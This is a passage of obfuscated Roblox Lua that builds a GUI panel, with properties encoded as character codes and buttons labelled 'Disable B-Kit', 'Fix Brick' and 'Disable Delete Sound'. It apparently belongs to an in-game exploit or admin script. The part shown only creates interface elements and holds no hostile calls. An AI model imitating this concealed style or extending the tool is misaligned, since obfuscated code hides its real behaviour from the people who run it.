_llza[_sc(51,55,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,55,52)]);
_llza[_sc(51,55,53)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(51,55,53)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(51,55,53)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,55,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,55,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,55,52)]);
_llza[_sc(51,55,54)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,55,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,55,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,55,54)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(51,55,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,55,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,55,54)]);
_llza[_sc(51,55,55)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,55,55)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,55,56)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,55,54)]);
_llza[_sc(51,55,56)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,55,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,55,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,55,56)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(51,55,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,55,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,55,57)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,55,56)]);
_llza[_sc(51,55,57)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,55,57)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,55,97)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,55,52)]);
_llza[_sc(51,55,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,55,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,55,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,55,97)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,55,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,55,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,55,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,55,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,55,97)][_sc(84,101,120,116)]=[[Disable Delete Sound]];
_llza[_sc(51,55,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,55,97)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(51,55,97)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,55,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,55,97)]);
_llza[_sc(51,55,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,55,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,55,51)]);
_llza[_sc(51,55,99)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(51,55,99)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(51,55,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,55,99)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(51,55,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,55,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(51,55,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,55,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,49)]);
_llza[_sc(51,55,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(51,55,100)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=4;
_llza[_sc(51,55,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,55,100)][_sc(78,97,109,101)]=[[disablebkit]];
_llza[_sc(51,55,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,55,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,55,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,55,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,55,101)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,55,100)]);
_llza[_sc(51,55,101)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(51,55,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,55,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,55,101)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,55,101)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,55,101)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,55,101)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,55,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,55,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,55,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,55,101)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,55,102)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,55,101)]);
_llza[_sc(51,55,102)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(51,55,102)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(51,55,102)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,55,102)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,56,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,55,101)]);
_llza[_sc(51,56,48)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,56,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,56,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,56,48)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(51,56,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,56,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,56,48)]);
_llza[_sc(51,56,49)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,56,49)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,56,50)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,56,48)]);
_llza[_sc(51,56,50)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,56,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,56,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,56,50)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(51,56,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,56,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,56,51)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,56,50)]);
_llza[_sc(51,56,51)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,56,51)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,56,52)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,55,101)]);
_llza[_sc(51,56,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,56,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,56,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,56,52)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,56,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,56,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,56,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,56,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,56,52)][_sc(84,101,120,116)]=[[Disable B-Kit]];
_llza[_sc(51,56,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,56,52)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(51,56,52)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,56,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,56,52)]);
_llza[_sc(51,56,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,56,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,55,100)]);
_llza[_sc(51,56,54)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(51,56,54)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(51,56,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,56,54)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(51,56,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,56,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(51,56,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,56,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,49)]);
_llza[_sc(51,56,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 10);
_llza[_sc(51,56,55)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=3;
_llza[_sc(51,56,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,56,55)][_sc(78,97,109,101)]=[[---DIVIDER---]];
_llza[_sc(51,56,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,56,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,56,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,56,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,56,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,56,55)]);
_llza[_sc(51,56,56)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,56,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,56,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,56,56)][_sc(78,97,109,101)]=[[dividerFrame]];
_llza[_sc(51,56,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,56,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,56,56)]);
_llza[_sc(51,56,57)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,56,57)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,56,97)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,56,56)]);
_llza[_sc(51,56,97)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,56,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,56,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,56,97)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(51,56,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,56,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,56,98)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,56,97)]);
_llza[_sc(51,56,98)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,56,98)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,56,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,56,56)]);
_llza[_sc(51,56,99)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,56,100)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(51,56,56)]);
_llza[_sc(51,56,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,56,55)]);
_llza[_sc(51,56,101)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(51,56,101)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(51,56,101)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 6);
_llza[_sc(51,56,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(51,56,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,49)]);
_llza[_sc(51,56,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(51,56,102)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=4;
_llza[_sc(51,56,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,56,102)][_sc(78,97,109,101)]=[[fixbrick]];
_llza[_sc(51,56,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,56,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,56,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,56,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,57,48)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,56,102)]);
_llza[_sc(51,57,48)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(51,57,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,57,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,57,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,57,48)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,57,48)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,57,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,57,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,57,48)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,57,49)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,57,48)]);
_llza[_sc(51,57,49)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(51,57,49)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(51,57,49)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,57,49)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,57,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,57,48)]);
_llza[_sc(51,57,50)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,57,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,57,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,57,50)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(51,57,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,57,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,57,50)]);
_llza[_sc(51,57,51)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,57,51)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,57,52)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,57,50)]);
_llza[_sc(51,57,52)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,57,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57,52)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(51,57,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,57,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,57,53)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,57,52)]);
_llza[_sc(51,57,53)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,57,53)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,57,54)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,57,48)]);
_llza[_sc(51,57,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,57,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,57,54)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,57,54)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,57,54)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,57,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,57,54)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,57,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57,54)][_sc(84,101,120,116)]=[[Fix Brick]];
_llza[_sc(51,57,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,57,54)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(51,57,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,57,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,57,54)]);
_llza[_sc(51,57,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,57,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,56,102)]);
_llza[_sc(51,57,56)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(51,57,56)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(51,57,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57,56)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(51,57,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,57,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(51,57,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,57,57)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,53,49)]);
_llza[_sc(51,57,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(51,57,57)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=4;
_llza[_sc(51,57,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57,57)][_sc(78,97,109,101)]=[[restorebrick]];
_llza[_sc(51,57,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,57,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,57,57)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,57,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,57,97)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(51,57,57)]);
_llza[_sc(51,57,97)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(51,57,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,57,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,57,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,57,97)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,57,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,57,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,57,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,57,97)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(51,57,98)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,57,97)]);
_llza[_sc(51,57,98)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(51,57,98)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(51,57,98)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(51,57,98)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(51,57,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,57,97)]);
_llza[_sc(51,57,99)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(51,57,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,57,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,57,99)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(51,57,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,57,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,57,99)]);
_llza[_sc(51,57,100)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,57,100)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(51,57,101)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,57,99)]);
_llza[_sc(51,57,101)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,57,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,57,101)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(51,57,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,57,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,57,102)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,57,101)]);
_llza[_sc(51,57,102)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,57,102)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,97,48)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,57,97)]);
